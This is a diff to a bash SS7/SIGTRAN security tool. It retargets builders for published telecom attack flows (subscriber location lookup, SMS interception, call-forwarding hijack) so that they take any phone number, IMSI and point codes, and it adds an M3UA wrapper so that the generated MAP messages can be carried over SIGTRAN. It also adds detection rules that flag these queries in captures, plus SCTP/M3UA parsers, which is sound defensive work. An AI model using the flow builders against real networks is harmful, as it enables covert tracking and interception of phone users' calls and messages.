@@ -1014,28 +1014,35 @@ ss7_build_msu() {
 # The argument builder's exit status is checked explicitly: an empty argument
 # from a rejected MSISDN/IMSI must fail the build, not produce a
 # syntactically valid invoke with no parameter.
+#
+# Point codes are the LAST two positional arguments (<dpc> <opc>, decimal
+# 0-16383) on every builder; they default to the test label. The calling and
+# called SSNs are deliberately NOT parameters: they encode the operation's
+# real direction (ATI only legitimately originates at the GMLC, ISD only runs
+# HLR -> VLR), so a caller-chosen SSN would let the build describe an exchange
+# the protocol does not permit.
 ss7_build_sri()    { local a; a=$(ss7_arg_sri    "${1:-}")            || return 1
-                     ss7_build_msu 22 "$a" "${2:-1}" "${3:-00000001}"; }
+                     ss7_build_msu 22 "$a" "${2:-1}" "${3:-00000001}" 6 8   "${4:-1}" "${5:-2}"; }
 ss7_build_sri_sm() { local a; a=$(ss7_arg_sri_sm "${1:-}" "${2:-}")   || return 1
-                     ss7_build_msu 45 "$a" "${3:-1}" "${4:-00000001}"; }
+                     ss7_build_msu 45 "$a" "${3:-1}" "${4:-00000001}" 6 8   "${5:-1}" "${6:-2}"; }
 # The GMLC (SSN 145) is the only legitimate ATI origin, so the reference
 # build uses it; --detect flags anything else.
 ss7_build_ati()    { local a; a=$(ss7_arg_ati    "${1:-}" "${2:-}")   || return 1
-                     ss7_build_msu 71 "$a" "${3:-1}" "${4:-00000001}" 6 145; }
+                     ss7_build_msu 71 "$a" "${3:-1}" "${4:-00000001}" 6 145 "${5:-1}" "${6:-2}"; }
 # ProvideSubscriberInfo runs HLR -> VLR.
 ss7_build_psi()    { local a; a=$(ss7_arg_psi    "${1:-}")            || return 1
-                     ss7_build_msu 70 "$a" "${2:-1}" "${3:-00000001}" 7 6; }
+                     ss7_build_msu 70 "$a" "${2:-1}" "${3:-00000001}" 7 6   "${4:-1}" "${5:-2}"; }
 ss7_build_ulr()    { local a; a=$(ss7_arg_ulr    "${1:-}" "${2:-}" "${3:-}") || return 1
-                     ss7_build_msu 2 "$a" "${4:-1}" "${5:-00000001}" 6 7; }
+                     ss7_build_msu 2 "$a" "${4:-1}" "${5:-00000001}" 6 7   "${6:-1}" "${7:-2}"; }
 ss7_build_sai()    { local a; a=$(ss7_arg_sai    "${1:-}" "${2:-5}")  || return 1
-                     ss7_build_msu 56 "$a" "${3:-1}" "${4:-00000001}" 6 7; }
+                     ss7_build_msu 56 "$a" "${3:-1}" "${4:-00000001}" 6 7   "${5:-1}" "${6:-2}"; }
 ss7_build_isd()    { local a; a=$(ss7_arg_isd    "${1:-}")            || return 1
-                     ss7_build_msu 7 "$a" "${2:-1}" "${3:-00000001}" 6 7; }
+                     ss7_build_msu 7 "$a" "${2:-1}" "${3:-00000001}" 6 7   "${4:-1}" "${5:-2}"; }
 # Supplementary-service management is VLR -> HLR.
 ss7_build_register_ss() { local a; a=$(ss7_arg_register_ss "${1:-33}" "${2:-}") || return 1
-                     ss7_build_msu 10 "$a" "${3:-1}" "${4:-00000002}" 6 7; }
+                     ss7_build_msu 10 "$a" "${3:-1}" "${4:-00000002}" 6 7  "${5:-1}" "${6:-2}"; }
 ss7_build_activate_ss() { local a; a=$(ss7_arg_activate_ss "${1:-33}") || return 1
-                     ss7_build_msu 12 "$a" "${2:-1}" "${3:-00000002}" 6 7; }
+                     ss7_build_msu 12 "$a" "${2:-1}" "${3:-00000002}" 6 7  "${4:-1}" "${5:-2}"; }
 
 # ── published attack flows as real message sequences ────────────────────
 # Each flow names its opcodes, builds the actual MSU for every step, and
@@ -1051,33 +1058,59 @@ ss7_flow_opcodes() {
     esac
 }
 
-ss7_flow_msisdn() { printf '%s' "33612345678"; }
-ss7_flow_imsi()   { printf '%s' "310150123456789"; }
+# The flow identities default to the published test subscriber so the shape
+# can be inspected without a target, but every one of them is an argument:
+# a flow built for the test IMSI cannot be handed to a lab STP and aimed at
+# the operator's own subscriber, which is the only way a flow is useful.
+ss7_flow_def_msisdn() { printf '%s' "33612345678"; }
+ss7_flow_def_imsi()   { printf '%s' "310150123456789"; }
+ss7_flow_def_opc()    { printf '%s' "2"; }
+ss7_flow_def_dpc()    { printf '%s' "1"; }
 
-ss7_flow_build_step() {  # <flow> <step-index>
-    local flow="${1:-}" n="${2:-1}" imsi msisdn
-    imsi=$(ss7_flow_imsi); msisdn=$(ss7_flow_msisdn)
+ss7_flow_build_step() {  # <flow> <step> <msisdn> <imsi> <opc> <dpc>
+    local flow="${1:-}" n="${2:-1}" msisdn="${3:-}" imsi="${4:-}"
+    local opc="${5:-}" dpc="${6:-}"
     case "$flow:$n" in
-        intercept:1)       ss7_build_sri "$msisdn" 1 00000001 ;;
-        intercept:2)       ss7_build_psi "$imsi" 2 00000001 ;;
-        locate:1)          ss7_build_sri "$msisdn" 1 00000001 ;;
-        locate:2)          ss7_build_ati "$imsi" "" 2 00000001 ;;
-        sms-intercept:1)   ss7_build_sri_sm "$msisdn" "" 1 00000001 ;;
-        sms-intercept:2)   ss7_build_msu 44 "$(ss7_arg_mt_forward_sm "$imsi")" 2 00000001 8 8 ;;
-        forward-hijack:1)  ss7_build_register_ss 33 "33600000000" 1 00000002 ;;
-        forward-hijack:2)  ss7_build_activate_ss 33 2 00000002 ;;
+        intercept:1)       ss7_build_sri "$msisdn" 1 00000001 "$dpc" "$opc" ;;
+        intercept:2)       ss7_build_psi "$imsi" 2 00000001 "$dpc" "$opc" ;;
+        locate:1)          ss7_build_sri "$msisdn" 1 00000001 "$dpc" "$opc" ;;
+        locate:2)          ss7_build_ati "$imsi" "" 2 00000001 "$dpc" "$opc" ;;
+        sms-intercept:1)   ss7_build_sri_sm "$msisdn" "" 1 00000001 "$dpc" "$opc" ;;
+        sms-intercept:2)   ss7_build_msu 44 "$(ss7_arg_mt_forward_sm "$imsi")" 2 00000001 8 8 "$dpc" "$opc" ;;
+        forward-hijack:1)  ss7_build_register_ss 33 "$msisdn" 1 00000002 "$dpc" "$opc" ;;
+        forward-hijack:2)  ss7_build_activate_ss 33 2 00000002 "$dpc" "$opc" ;;
         *) return 1 ;;
     esac
 }
 
-ss7_flow() {
+ss7_flow() {  # <flow> [msisdn] [imsi] [opc] [dpc]
     local flow="${1:-}" seq step op msu
+    local msisdn="${2:-}" imsi="${3:-}" opc="${4:-}" dpc="${5:-}"
     seq=$(ss7_flow_opcodes "$flow") || {
         printf 'ERROR\tunknown flow: %s (want intercept|locate|sms-intercept|forward-hijack)\n' \
             "$(ss7_sanitize "${flow:-<none>}")" >&2
         return 2
     }
+    [[ -n "$msisdn" ]] || msisdn=$(ss7_flow_def_msisdn)
+    [[ -n "$imsi"   ]] || imsi=$(ss7_flow_def_imsi)
+    [[ -n "$opc"    ]] || opc=$(ss7_flow_def_opc)
+    [[ -n "$dpc"    ]] || dpc=$(ss7_flow_def_dpc)
+    # The caller's identity and label are validated here rather than left to
+    # the step builder, so a bad target fails before any hex is printed: a
+    # flow whose first step is missing is worse than no flow at all.
+    ss7_msisdn_hex "$msisdn" >/dev/null 2>&1 || {
+        printf 'ERROR\tnot an encodable MSISDN: %s\n' "$(ss7_sanitize "$msisdn")" >&2; return 2; }
+    ss7_imsi_hex "$imsi" >/dev/null 2>&1 || {
+        printf 'ERROR\tnot an encodable IMSI: %s\n' "$(ss7_sanitize "$imsi")" >&2; return 2; }
+    for pc in "$opc" "$dpc"; do
+        [[ "$pc" =~ ^[0-9]+$ ]] && (( pc <= 16383 )) || {
+            printf 'ERROR\tpoint code must be decimal 0-16383: %s\n' "$(ss7_sanitize "$pc")" >&2; return 2; }
+    done
     printf 'flow\t%s\n' "$flow"
+    printf 'opc\t%s\n'  "$opc"
+    printf 'dpc\t%s\n'  "$dpc"
+    printf 'msisdn\t%s\n' "$msisdn"
+    printf 'imsi\t%s\n'   "$imsi"
     case "$flow" in
         intercept)
             printf 'objective\t%s\n' "resolve the serving VMSC from an MSISDN, then pull subscriber state and location from it"
@@ -1102,7 +1135,7 @@ ss7_flow() {
     esac
     local i=1
     for op in ${seq//,/ }; do
-        msu=$(ss7_flow_build_step "$flow" "$i") || return 1
+        msu=$(ss7_flow_build_step "$flow" "$i" "$msisdn" "$imsi" "$opc" "$dpc") || return 1
         printf 'step\t%s\t%s\t%s\t%s\t%s\n' "$i" "request" "$op" \
             "$(ss7_map_opcode_name "$op")" "${#msu}"
         printf 'step_hex\t%s\t%s\n' "$i" "$msu"
@@ -1182,52 +1215,105 @@ ss7_grx_recon() {
 # ── detection: the HLR-side view of an anomalous MAP query ──────────────
 # Pure function over TSV rows "frame calling_ssn called_ssn opcode". Keeping
 # it separate from the pcap reader makes it unit-testable without a capture.
+# The routing context that makes a finding actionable: an operator can act on
+# "this interconnect peer asked", not on "opcode 71 appeared". Field names are
+# the ones Wireshark actually defines -- `sccp.calling.digits` /
+# `sccp.called.digits`, since there is no `sccp.calling.gt` field.
+ss7_detect_route() {  # <opc> <dpc> <calling-digits> <called-digits>
+    local out="" sep=""
+    if [[ -n "${1:-}" || -n "${2:-}" ]]; then out="OPC ${1:-?} -> DPC ${2:-?}"; sep=", "; fi
+    if [[ -n "${3:-}" ]]; then out+="${sep}calling GT ${3}"; sep=", "; fi
+    if [[ -n "${4:-}" ]]; then out+="${sep}called GT ${4}"; fi
+    [[ -n "$out" ]] || return 0
+    printf ' [%s]' "$out"
+}
+
+# Reads TSV rows: frame, calling SSN, called SSN, opcode, and optionally
+# OPC, DPC, calling global title, called global title.
 ss7_detect_stream() {
-    local frame cssn dssn opcodename lineno=0
-    local -A seen_op
+    local frame cssn dssn op opc dpc cgt dgt lineno=0
+    local -A seen_op=() first_op_of_pc=() pc_count=()
+    local -a rows=()
+    local line
+
     while IFS= read -r line; do
-        [[ -z "$line" ]] && continue
-        ss7_split "$line"
+        [[ -n "$line" ]] && rows+=("$line")
+    done
+
+    # First pass: the per-point-code baseline. A peer's FIRST message being a
+    # subscriber-questioning opcode is the anomaly worth reporting; routine
+    # traffic establishes the peer before it ever asks about a subscriber.
+    local row
+    for row in "${rows[@]}"; do
+        ss7_split "$row"
+        op="${SS7_F[3]:-}"; opc="${SS7_F[4]:-}"
+        [[ -z "$op" ]] && continue
+        seen_op["$op"]=$(( ${seen_op[$op]:-0} + 1 ))
+        [[ -z "$opc" ]] && continue
+        pc_count["$opc"]=$(( ${pc_count[$opc]:-0} + 1 ))
+        [[ -n "${first_op_of_pc[$opc]:-}" ]] || first_op_of_pc["$opc"]="$op"
+    done
+
+    # Second pass: emit in capture order so the output reads like the capture.
+    for row in "${rows[@]}"; do
+        ss7_split "$row"
         frame="${SS7_F[0]:-}"; cssn="${SS7_F[1]:-}"; dssn="${SS7_F[2]:-}"; op="${SS7_F[3]:-}"
+        opc="${SS7_F[4]:-}"; dpc="${SS7_F[5]:-}"; cgt="${SS7_F[6]:-}"; dgt="${SS7_F[7]:-}"
         lineno=$(( lineno + 1 ))
         [[ -z "$op" ]] && continue
+        local opcodename route
         opcodename=$(ss7_map_opcode_name "$op")
-        seen_op["$op"]=$(( ${seen_op[$op]:-0} + 1 ))
+        route=$(ss7_detect_route "$opc" "$dpc" "$cgt" "$dgt")
         case "$op" in
             71) # ATI: legitimate callers are the GMLC (145), CAP (146) and gsmSCF (147)
                 case "$cssn" in
                     145|146|147|5|6) ;;
-                    *) printf 'FINDING\tHIGH\tati-from-non-gmlc\t%s\t%s\topcode 71 (anyTimeInterrogation) with calling SSN %s\n' \
-                        "$(ss7_sanitize "$frame")" "$opcodename" "$(ss7_sanitize "${cssn:-<empty>}")" ;;
+                    *) printf 'FINDING\tHIGH\tati-from-non-gmlc\t%s\t%s\topcode 71 (anyTimeInterrogation) with calling SSN %s%s\n' \
+                        "$(ss7_sanitize "$frame")" "$opcodename" "$(ss7_sanitize "${cssn:-<empty>}")" "$route" ;;
                 esac ;;
             22) # SRI is normally asked by an MSC/GMSC (8), a VLR (7) or an HLR (6)
                 case "$cssn" in
                     6|7|8|149) ;;
-                    *) printf 'FINDING\tMEDIUM\tsri-from-unexpected-ssn\t%s\t%s\topcode 22 (sendRoutingInfo) with calling SSN %s\n' \
-                        "$(ss7_sanitize "$frame")" "$opcodename" "$(ss7_sanitize "${cssn:-<empty>}")" ;;
+                    *) printf 'FINDING\tMEDIUM\tsri-from-unexpected-ssn\t%s\t%s\topcode 22 (sendRoutingInfo) with calling SSN %s%s\n' \
+                        "$(ss7_sanitize "$frame")" "$opcodename" "$(ss7_sanitize "${cssn:-<empty>}")" "$route" ;;
                 esac ;;
             45) # SRI-SM is asked by an SMSC; it must not come from a subscriber-facing node
                 case "$cssn" in
                     6|8|149) ;;
-                    *) printf 'FINDING\tMEDIUM\tsri-sm-from-unexpected-ssn\t%s\t%s\topcode 45 with calling SSN %s\n' \
-                        "$(ss7_sanitize "$frame")" "$opcodename" "$(ss7_sanitize "${cssn:-<empty>}")" ;;
+                    *) printf 'FINDING\tMEDIUM\tsri-sm-from-unexpected-ssn\t%s\t%s\topcode 45 with calling SSN %s%s\n' \
+                        "$(ss7_sanitize "$frame")" "$opcodename" "$(ss7_sanitize "${cssn:-<empty>}")" "$route" ;;
                 esac ;;
             2)  # ULR is a VLR->HLR operation
-                [[ "$dssn" == "6" ]] || printf 'FINDING\tHIGH\tulr-not-toward-hlr\t%s\t%s\topcode 2 with called SSN %s\n' \
-                    "$(ss7_sanitize "$frame")" "$opcodename" "$(ss7_sanitize "${dssn:-<empty>}")"
-                [[ "$cssn" == "7" || "$cssn" == "8" ]] || printf 'FINDING\tHIGH\tulr-from-unexpected-vmsc\t%s\t%s\topcode 2 from calling SSN %s\n' \
-                    "$(ss7_sanitize "$frame")" "$opcodename" "$(ss7_sanitize "${cssn:-<empty>}")" ;;
+                [[ "$dssn" == "6" ]] || printf 'FINDING\tHIGH\tulr-not-toward-hlr\t%s\t%s\topcode 2 with called SSN %s%s\n' \
+                    "$(ss7_sanitize "$frame")" "$opcodename" "$(ss7_sanitize "${dssn:-<empty>}")" "$route"
+                [[ "$cssn" == "7" || "$cssn" == "8" ]] || printf 'FINDING\tHIGH\tulr-from-unexpected-vmsc\t%s\t%s\topcode 2 from calling SSN %s%s\n' \
+                    "$(ss7_sanitize "$frame")" "$opcodename" "$(ss7_sanitize "${cssn:-<empty>}")" "$route" ;;
             10|12) # the call-forwarding hijack primitives
-                printf 'FINDING\tHIGH\tforwarding-registration\t%s\t%s\topcode %s (%s) toward SSN %s\n' \
-                    "$(ss7_sanitize "$frame")" "$opcodename" "$(ss7_sanitize "$op")" "$opcodename" "$(ss7_sanitize "${dssn:-<empty>}")" ;;
+                printf 'FINDING\tHIGH\tforwarding-registration\t%s\t%s\topcode %s (%s) toward SSN %s%s\n' \
+                    "$(ss7_sanitize "$frame")" "$opcodename" "$(ss7_sanitize "$op")" "$opcodename" "$(ss7_sanitize "${dssn:-<empty>}")" "$route" ;;
             0) ;;
             *)
                 if ! ss7_opcode_known "$op"; then
-                    printf 'FINDING\tLOW\tunknown-opcode\t%s\t%s\topcode %s is not assigned in TS 29.002\n' \
-                        "$(ss7_sanitize "$frame")" "$opcodename" "$(ss7_sanitize "$op")"
+                    printf 'FINDING\tLOW\tunknown-opcode\t%s\t%s\topcode %s is not assigned in TS 29.002%s\n' \
+                        "$(ss7_sanitize "$frame")" "$opcodename" "$(ss7_sanitize "$op")" "$route"
                 fi ;;
         esac
     done
+
+    # A point code whose very first message in the capture is a query about a
+    # subscriber never announced itself with routine traffic. That is the
+    # hit-and-run shape, and it names the peer.
+    local pc fop
+    for pc in "${!first_op_of_pc[@]}"; do
+        [[ -n "$pc" ]] || continue
+        fop="${first_op_of_pc[$pc]}"
+        case "$fop" in
+            71|22|45|2|10|12)
+                printf 'FINDING\tHIGH\tfirst-message-is-a-query\t-\t%s\tOPC %s appears %s time(s) in the capture and its first message is opcode %s\n' \
+                    "$(ss7_map_opcode_name "$fop")" "$(ss7_sanitize "$pc")" "${pc_count[$pc]}" "$(ss7_sanitize "$fop")" ;;
+        esac
+    done
+
     # A single opcode repeated beyond any plausible retransmission count is a
     # flood, not a query pattern.
     local k
@@ -1246,7 +1332,13 @@ ss7_cmd_detect() {
     [[ -r "$pcap" ]] || { printf 'ERROR\tcannot read capture: %s\n' "$(ss7_sanitize "$pcap")" >&2; return 1; }
     command -v tshark >/dev/null 2>&1 || { printf 'MISSING\ttshark is required for pcap detection\n' >&2; return 1; }
     local rows
-    rows=$(tshark -r "$pcap" -n -T fields -e frame.number -e sccp.calling.ssn -e sccp.called.ssn -e gsm_old.opCode 2>/dev/null) || {
+    # The routing label and the global title are what make a finding
+    # actionable, so they are extracted alongside the SSN and opcode. The
+    # global title lives in sccp.calling.digits / sccp.called.digits;
+    # tshark defines no sccp.calling.gt field.
+    rows=$(tshark -r "$pcap" -n -T fields \
+        -e frame.number -e sccp.calling.ssn -e sccp.called.ssn -e gsm_old.opCode \
+        -e mtp3.opc -e mtp3.dpc -e sccp.calling.digits -e sccp.called.digits 2>/dev/null) || {
         printf 'ERROR\ttshark could not read %s\n' "$(ss7_sanitize "$pcap")" >&2; return 1
     }
     printf 'capture\t%s\n' "$(ss7_sanitize "$pcap")"
@@ -1472,6 +1564,267 @@ ss7_cmd_decode_msu() {
     ss7_sccp_parse "${hex:10}"
 }
 
+# ── SIGTRAN: SCTP + M3UA ────────────────────────────────────────────────
+# Real interconnect traffic is SCTP/M3UA, not bare MTP3, and this module's
+# own plan hands the MSU to the lab STP as the M3UA payload -- so without
+# this layer the operator has to strip two headers by hand before
+# --decode-msu sees anything. Every offset below is from the RFCs:
+#   SCTP common header 12 octets, source port first (RFC 4960 §3.1)
+#   SCTP chunk header 4 octets; a DATA chunk header is 16 octets, with the
+#     Payload Protocol Identifier at offset 12 of the chunk (RFC 4960 §3.3.1)
+#   M3UA runs in a DATA chunk with PPID 3 (RFC 4666 §7.1)
+#   M3UA common header 8 octets, all fields network byte order, length
+#     including the header and any parameter padding (RFC 4666 §3.1)
+#   M3UA parameters are Tag(2) Length(2) Value; Length includes the 4-octet
+#     tag and length but NOT the padding, and the value is padded with at
+#     most 3 zero octets to a 4-octet boundary (RFC 4666 §3.2)
+ss7_sctp_chunk_name() {
+    case "${1:-0}" in
+        0)  printf 'DATA' ;;
+        1)  printf 'INIT' ;;
+        2)  printf 'INIT ACK' ;;
+        3)  printf 'SACK' ;;
+        4)  printf 'HEARTBEAT' ;;
+        5)  printf 'HEARTBEAT ACK' ;;
+        6)  printf 'ABORT' ;;
+        7)  printf 'SHUTDOWN' ;;
+        8)  printf 'SHUTDOWN ACK' ;;
+        9)  printf 'ERROR' ;;
+        10) printf 'COOKIE ECHO' ;;
+        11) printf 'COOKIE ACK' ;;
+        14) printf 'SHUTDOWN COMPLETE' ;;
+        15) printf 'AUTH' ;;
+        *)  printf 'unknown chunk type %s' "$1" ;;
+    esac
+}
+
+ss7_m3ua_class_name() {
+    case "${1:-0}" in
+        0)      printf 'MGMT (management)' ;;
+        1)      printf 'Transfer' ;;
+        2)      printf 'SSNM (SS7 signalling network management)' ;;
+        3)      printf 'ASPSM (ASP state maintenance)' ;;
+        4)      printf 'ASPTM (ASP traffic maintenance)' ;;
+        5|6|7|8) printf 'reserved for other SIGTRAN adaptation layers' ;;
+        9)      printf 'RKM (routing key management)' ;;
+        *)      printf 'unknown class %s' "$1" ;;
+    esac
+}
+
+ss7_m3ua_type_name() {  # <class> <type>
+    case "${1:-0}:${2:-0}" in
+        0:0) printf 'ERR' ;; 0:1) printf 'NTFY' ;;
+        1:1) printf 'DATA' ;;
+        2:1) printf 'DUNA' ;; 2:2) printf 'DAVA' ;; 2:3) printf 'DAUD' ;;
+        2:4) printf 'SCON' ;; 2:5) printf 'DUPU' ;; 2:6) printf 'DRST' ;;
+        3:1) printf 'ASPUP' ;; 3:2) printf 'ASPDN' ;; 3:3) printf 'BEAT' ;;
+        3:4) printf 'ASPUP ACK' ;; 3:5) printf 'ASPDN ACK' ;; 3:6) printf 'BEAT ACK' ;;
+        4:1) printf 'ASPAC' ;; 4:2) printf 'ASPIA' ;;
+        4:3) printf 'ASPAC ACK' ;; 4:4) printf 'ASPIA ACK' ;;
+        9:1) printf 'REG REQ' ;; 9:2) printf 'REG RSP' ;;
+        9:3) printf 'DEREG REQ' ;; 9:4) printf 'DEREG RSP' ;;
+        *)   printf 'unspecified' ;;
+    esac
+}
+
+# The argument is the DECIMAL tag: bash `case` patterns are globs, so a
+# literal `0x0210` pattern never matches the number 528. The hex value is
+# given in the comment beside each arm.
+ss7_m3ua_tag_name() {
+    case "${1:-0}" in
+        3)   printf 'Protocol Version (0x0003)' ;;
+        4)   printf 'Activation (0x0004)' ;;
+        5)   printf 'Reason (0x0005)' ;;
+        6)   printf 'Routing Context (0x0006)' ;;
+        7)   printf 'Diagnostic Info (0x0007)' ;;
+        9)   printf 'Heartbeat Data (0x0009)' ;;
+        11)  printf 'Traffic Mode Type (0x000B)' ;;
+        12)  printf 'Error Code (0x000C)' ;;
+        13)  printf 'Status (0x000D)' ;;
+        18)  printf 'INFO String (0x0012)' ;;
+        19)  printf 'Correlation Id (0x0013)' ;;
+        512) printf 'Network Appearance (0x0200)' ;;
+        516) printf 'User/Cause (0x0204)' ;;
+        517) printf 'Congestion Indication (0x0205)' ;;
+        518) printf 'Concerned Destination (0x0206)' ;;
+        528) printf 'Protocol Data (0x0210, the SS7 MTP3 message)' ;;
+        *)   printf 'tag 0x%04X' "$1" ;;
+    esac
+}
+
+# Walk the SCTP datagram and print every chunk header, then the M3UA payload
+# of the first DATA chunk. The ports and verification tag are printed because
+# they identify the association; without them a finding cannot be tied to a
+# signalling peer.
+ss7_sctp_strip() {  # <hex>
+    local hex; hex=$(ss7_nfc "${1:-}")
+    local hexlen=${#hex}
+    (( hexlen >= 24 )) || { printf 'ERROR\tSCTP needs at least a 12-octet common header\n' >&2; return 1; }
+    ss7_is_hex "$hex" || { printf 'ERROR\tnot valid hex\n' >&2; return 1; }
+    printf 'sctp_sport\t%s\n' "$(( 16#${hex:0:2}${hex:2:2} ))"
+    printf 'sctp_dport\t%s\n' "$(( 16#${hex:4:2}${hex:6:2} ))"
+    printf 'sctp_vtag\t0x%s\n' "${hex:8:8}"
+    # `off` is a HEX-CHARACTER offset into the string, not an octet count:
+    # the 12-octet SCTP common header is the first 24 characters.
+    local off=24 type flags clen pad payload ppid tsn sid ssn found=0
+    while (( off + 8 <= hexlen )); do
+        type=$(( 16#${hex:$off:2} ))
+        flags=$(( 16#${hex:$(( off + 2 )):2} ))
+        clen=$(( 16#${hex:$(( off + 4 )):4} ))
+        (( clen >= 4 )) || { printf 'ERROR\tchunk length %s is below its 4-octet header\n' "$clen" >&2; return 1; }
+        (( off + clen * 2 <= hexlen )) || {
+            printf 'ERROR\tchunk length %s runs past the datagram\n' "$clen" >&2; return 1; }
+        printf 'chunk_type\t%s\n'   "$type"
+        printf 'chunk_name\t%s\n'   "$(ss7_sctp_chunk_name "$type")"
+        printf 'chunk_flags\t%s\n'  "$flags"
+        printf 'chunk_octets\t%s\n' "$clen"
+        if (( type == 0 && found == 0 )); then
+            (( clen >= 16 )) || { printf 'ERROR\tDATA chunk shorter than its 16-octet header\n' >&2; return 1; }
+            # Offsets inside the chunk, again in hex characters: TSN at
+            # octet 4 (+8 chars), stream id at octet 8 (+16), stream sequence
+            # at octet 10 (+20), PPID at octet 12 (+24), user data at octet
+            # 16 (+32).
+            tsn=$(( 16#${hex:$(( off + 8 )):8} ))
+            sid=$(( 16#${hex:$(( off + 16 )):4} ))
+            ssn=$(( 16#${hex:$(( off + 20 )):4} ))
+            ppid=$(( 16#${hex:$(( off + 24 )):8} ))
+            printf 'data_tsn\t%s\n'     "$tsn"
+            printf 'data_stream\t%s\n'  "$sid"
+            printf 'data_ssn\t%s\n'     "$ssn"
+            printf 'data_ppid\t%s\n'    "$ppid"
+            printf 'data_ppid_name\t%s\n' "$( (( ppid == 3 )) && printf 'M3UA' || printf 'not M3UA (0 unspecified, 3 M3UA)' )"
+            payload="${hex:$(( off + 32 )):$(( clen * 2 - 32 ))}"
+            printf 'data_payload\t%s\n' "$payload"
+            found=1
+        fi
+        pad=$(( ( 4 - clen % 4 ) % 4 ))
+        off=$(( off + clen * 2 + pad * 2 ))
+    done
+    (( found == 1 )) || { printf 'ERROR\tno DATA chunk in the datagram\n' >&2; return 1; }
+    return 0
+}
+
+ss7_m3ua_parse() {  # <hex>
+    local hex; hex=$(ss7_nfc "${1:-}")
+    local hexlen=${#hex}
+    (( hexlen >= 16 )) || { printf 'ERROR\tM3UA needs at least an 8-octet common header\n' >&2; return 1; }
+    local ver res class type len
+    ver=$(( 16#${hex:0:2} ))
+    res=$(( 16#${hex:2:2} ))
+    class=$(( 16#${hex:4:2} ))
+    type=$(( 16#${hex:6:2} ))
+    len=$(( 16#${hex:8:8} ))
+    printf 'm3ua_version\t%s\n'      "$ver"
+    printf 'm3ua_reserved\t%s\n'     "$res"
+    printf 'm3ua_class\t%s\n'        "$class"
+    printf 'm3ua_class_name\t%s\n'   "$(ss7_m3ua_class_name "$class")"
+    printf 'm3ua_type\t%s\n'         "$type"
+    printf 'm3ua_type_name\t%s\n'    "$(ss7_m3ua_type_name "$class" "$type")"
+    printf 'm3ua_length\t%s\n'       "$len"
+    (( ver == 1 )) || printf 'warn\tversion %s is not the only defined M3UA version (1)\n' "$ver"
+    (( len * 2 <= hexlen )) || {
+        printf 'ERROR\tM3UA length %s exceeds the %s octets present\n' "$len" "$(( hexlen / 2 ))" >&2; return 1; }
+    (( len * 2 == hexlen )) || printf 'note\t%s octets follow the declared M3UA message and are not part of it\n' "$(( ( hexlen - len * 2 ) / 2 ))"
+    local off=16 end=$(( len * 2 )) tag tlen tval pad
+    while (( off + 8 <= end )); do
+        tag=$(( 16#${hex:$off:4} ))
+        tlen=$(( 16#${hex:$(( off + 4 )):4} ))
+        (( tlen >= 4 )) || { printf 'ERROR\tparameter length %s is below its 4-octet header\n' "$tlen" >&2; return 1; }
+        (( off + tlen * 2 <= end )) || {
+            printf 'ERROR\tparameter 0x%04X runs past the message\n' "$tag" >&2; return 1; }
+        tval="${hex:$(( off + 8 )):$(( tlen * 2 - 8 ))}"
+        printf 'param_tag\t0x%04X\n'  "$tag"
+        printf 'param_name\t%s\n'     "$(ss7_m3ua_tag_name "$tag")"
+        printf 'param_octets\t%s\n'   "$tlen"
+        printf 'param_value\t%s\n'    "$tval"
+        (( tag == 0x0210 )) && printf 'protocol_data\t%s\n' "$tval"
+        pad=$(( ( 4 - tlen % 4 ) % 4 ))
+        off=$(( off + tlen * 2 + pad * 2 ))
+    done
+    return 0
+}
+
+ss7_m3ua_u32() { printf '%08X' "$(( ${1:-0} & 0xFFFFFFFF ))"; }
+# Parameter Length is 16 bits and counts the 4-octet tag+length header but
+# not the padding (RFC 4666 §3.2); the value that follows is 32 bits.
+ss7_m3ua_u16() { printf '%04X' "$(( ${1:-0} & 0xFFFF ))"; }
+
+# Build the M3UA DATA message that carries an MTP3 message. The Protocol Data
+# parameter is defined to contain "the original SS7 MTP3 message, including
+# the Service Information Octet and Routing Label" (RFC 4666 §3.3.1), so the
+# OPC/DPC/SI are NOT arguments here: they are already inside the MSU, and
+# accepting them separately would let a caller build a wrapper whose header
+# contradicts the message it carries.
+ss7_build_m3ua() {  # <msu-hex> [routing-context] [network-appearance]
+    local msu; msu=$(ss7_nfc "${1:-}")
+    ss7_is_hex "$msu" || { printf 'ERROR\t--build-m3ua needs MSU hex\n' >&2; return 2; }
+    local mlen=$(( ${#msu} / 2 ))
+    (( mlen >= 5 )) || { printf 'ERROR\tMSU shorter than SIO + routing label (5 octets)\n' >&2; return 1; }
+    local rc="${2:-}" na="${3:-}" pc
+    for pc in "$rc" "$na"; do
+        [[ -z "$pc" ]] && continue
+        [[ "$pc" =~ ^[0-9]+$ ]] && (( pc <= 4294967295 )) || {
+            printf 'ERROR\trouting context and network appearance are 32-bit unsigned: %s\n' "$(ss7_sanitize "$pc")" >&2; return 2; }
+    done
+    local body=""
+    [[ -n "$na" ]] && body+="0200$(ss7_m3ua_u16 8)$(ss7_m3ua_u32 "$na")"
+    [[ -n "$rc" ]] && body+="0006$(ss7_m3ua_u16 8)$(ss7_m3ua_u32 "$rc")"
+    local pdlen=$(( mlen + 4 ))
+    local pdpad=$(( ( 4 - mlen % 4 ) % 4 ))
+    # Parameter padding is at most 3 zero octets and is NOT counted in the
+    # parameter length, but IS counted in the M3UA message length.
+    local pdpad_hex=""
+    (( pdpad > 0 )) && pdpad_hex=$(printf '%0*d' "$(( pdpad * 2 ))" 0)
+    body+="0210$(ss7_m3ua_u16 "$pdlen")$msu$pdpad_hex"
+    local total=$(( 8 + ${#body} / 2 ))
+    printf '01000101%s%s' "$(ss7_m3ua_u32 "$total")" "$body"
+}
+
+ss7_cmd_build_m3ua() {  # <msu-hex> [routing-context] [network-appearance]
+    local msu; msu=$(ss7_nfc "${1:-}")
+    [[ -n "$msu" ]] || { printf 'ERROR\tusage: --build-m3ua <msu-hex> [routing-context] [network-appearance]\n' >&2; return 2; }
+    local out
+    out=$(ss7_build_m3ua "$msu" "${2:-}" "${3:-}") || return 1
+    local mlen=$(( ${#msu} / 2 ))
+    printf 'layer\tm3ua\n'
+    printf 'message\tDATA (class 1, type 1)\n'
+    printf 'msu_octets\t%s\n' "$mlen"
+    printf 'msu_hex\t%s\n'   "$msu"
+    printf 'protocol_data_tag\t0x0210\n'
+    printf 'protocol_data_octets\t%s\n' "$(( mlen + 4 ))"
+    printf 'proto_pad_octets\t%s\n' "$(( ( 4 - mlen % 4 ) % 4 ))"
+    printf 'm3ua_octets\t%s\n'  "$(( ${#out} / 2 ))"
+    printf 'm3ua_hex\t%s\n'     "$out"
+    printf 'sctp_ppid\t3\n'
